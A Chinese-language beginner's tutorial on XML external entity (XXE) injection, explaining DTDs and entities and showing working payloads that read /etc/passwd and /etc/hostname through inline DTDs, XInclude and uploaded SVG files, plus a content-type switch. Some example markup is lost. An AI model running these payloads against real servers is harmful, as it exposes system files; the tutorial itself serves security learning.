XXE全称：XML外部实体注入

0x01 什么是XML

XML: 可以简单的将XML理解为传输文件时的文件，详细见小白须知的XML知识

0x02 什么是XML外部实体注入

​ XML外部实体注入(也称为XXE)是一个网络安全漏洞，允许攻击者干扰应用程序对XML数据的处理。

​ 它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。

  • 在某些情况下，攻击者可以通过利用XXE漏洞执行SSRF攻击来升级XXE攻击，从而损害基础服务器或其他后端基础架构。

0x03 需要明白的几个概念

1.XML实体

类似于html中的标签<>以及<and>的这些标签

2.文档类型定义

文档类型定义——————全称Document Type Definition，用来验证XML文件书写是否符合标准，可以定在在XML文档开头，也可以在内部，也可以在节点声明。

3.XML自定义实体

类似于C语言当中的类，XML允许在DTD中自定义实体，例如

]>

在此XML语句中，先声明了一个名为foo的DTD，然后在DTD中声明了一个自定义实体，名为myentity，该自定义实体中的数据为”my entity value”，可以使用&myentity&的方式对其引用。

4.XML外部实体

是自定义实体当中的一种，它声明的在DTD之外，外部实体的声明使用SYSTEM关键字，然后指定加载实体值的URL，例如

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "https://baidu.com" > ]>

URL也可以是使用file伪协议从而加载指定的文件内容，例如

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

XXE漏洞就是利用上述特性进行攻击

0x04 XXE注入的实际应用

1. 利用XXE检索文件(file)

例如，某购物应用程序通过以下XML代码来检查产品库存

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

而若该应用程序对XXE注入不执行特定防御，通过修改/添加 DTD的方式：

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

0x04 XXE盲注

XXE盲注，类似于SQL盲注，即无回显，所以无法直接检索服务器端文件

有两种广泛的方法可以发现和利用盲目的XXE漏洞：

  • 触发带外网络交互，有时在交互数据中渗出敏感数据。

  • 触发 XML 解析错误，使错误消息包含敏感数据。

0x05 非XML格式，发起XXE攻击

1. XInclude攻击

有些应用程序的服务端会将从客户端接收的内容嵌入到XML文档中然后解析，这就导致因为我们无法控制整个XML文档而无法发动常规的XXE攻击。

但是我们可以通过XInclude在该XML文档中构建子XML文档，想要使用XInclude我们需要引入相应的命名空间。

这里的payload以使用file函数读取文件为例

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

将值修改为xml，如图

2.通过文件上传进行XXE注入

原理：某些应用程序允许用户上传文件，然后处理服务器端。某些常见文件格式使用XML或包含XML子组件。基于XML的格式例如DOCX和SVG。

payload:

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

一般作为头像上传，能够在图像(头像)中看到/etc/hostname文件的内容

3.修改HTTP请求中的content进行XXE注入

例如我们看到的HTML表单

POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

可以通过XML的方式进行攻击

POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
